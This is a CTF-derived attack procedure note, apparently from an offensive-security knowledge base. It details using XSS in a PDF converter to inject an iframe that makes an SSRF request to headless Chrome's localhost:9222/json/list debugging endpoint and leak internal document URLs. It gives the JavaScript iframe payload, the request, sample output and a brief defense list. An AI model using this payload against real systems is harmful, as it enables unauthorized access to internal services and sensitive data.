---
tags:
  - ssrf
  - headless-chrome
  - remote-debugging
type: procedure
tools:
  - '[[tools/chrome-devtools-protocol]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/create-iframe-ssrf-chrome]]'
  - '[[commands/get-chrome-debug-json-list]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:10.015Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 596b1f52-18c2-401f-acc9-dcf2089fae1c
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# SSRF-via-Iframe-to-Headless-Chrome-Debugging-Port

## Summary

This procedure exploits XSS in the PDF converter to inject an iframe that performs Server-Side Request Forgery (SSRF) to the localhost:9222 remote debugging port of headless Chrome, accessing /json/list to enumerate open tabs and leak internal URLs, including secret documents with sensitive flags.

## Description

The PDF converter renders the user name unsafely in HTML, allowing the injected XSS to execute JS that creates an iframe sourcing http://localhost:9222/json/list. With remote debugging enabled on port 9222, this SSRF lists all open tabs in the headless Chrome instance, revealing URLs like the secret document endpoint containing flags. No network restrictions prevent internal localhost requests from the converter page.

## Requirements

1. XSS payload already injected into target user's name via prior IDOR
2. Access to PDF converter endpoint (/converter/{doc_id}.png?user_name=)
3. Headless Chrome running with --remote-debugging-port=9222

## Defense

Defensive measures and detection strategies:

- Disable remote debugging in production headless Chrome instances
- Restrict iframe src to external domains only; block localhost/internal IPs
- Sanitize user name rendering with HTML escaping in templates
- Monitor Chrome logs for unauthorized /json/list accesses

## Objectives

1. Perform SSRF to internal debugging port
2. Enumerate open tabs and their URLs
3. Leak sensitive internal document URLs and flags

## Instructions

### Step 1: Trigger PDF Converter with Injected Name

**Context**: Access the converter URL with the target doc_id and user_name containing XSS.

Navigate to https://h1-415.h1ctf.com/converter/{doc_id}.png?user_name={xss_payload}

> Page renders, executing the injected JS.

### Step 2: Inject Iframe for SSRF

**Context**: The XSS runs [[commands/create-iframe-ssrf-chrome]] to create iframe to debugging endpoint.

```javascript
window.onload=function(){ document.write('<iframe src="http://localhost:9222/json/list" width="100%" height="100%"></iframe>'); };
```

> Iframe loads, performing SSRF request.

### Step 3: Access JSON List Endpoint

**Context**: The iframe sources [[commands/get-chrome-debug-json-list]], retrieving tab list.

```http
GET /json/list
```

> JSON output: Array of tabs with URLs, e.g., {"url": "https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab"}

### Step 4: Access Leaked URLs

**Context**: Use exposed URLs to fetch sensitive content.

GET the secret document URL.

> Retrieve flag or sensitive data.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/create-iframe-ssrf-chrome]]
- [[commands/get-chrome-debug-json-list]]

## Tools Used

- [[tools/chrome-devtools-protocol]]

## Tags

- ssrf
- iframe
- debugging-leak
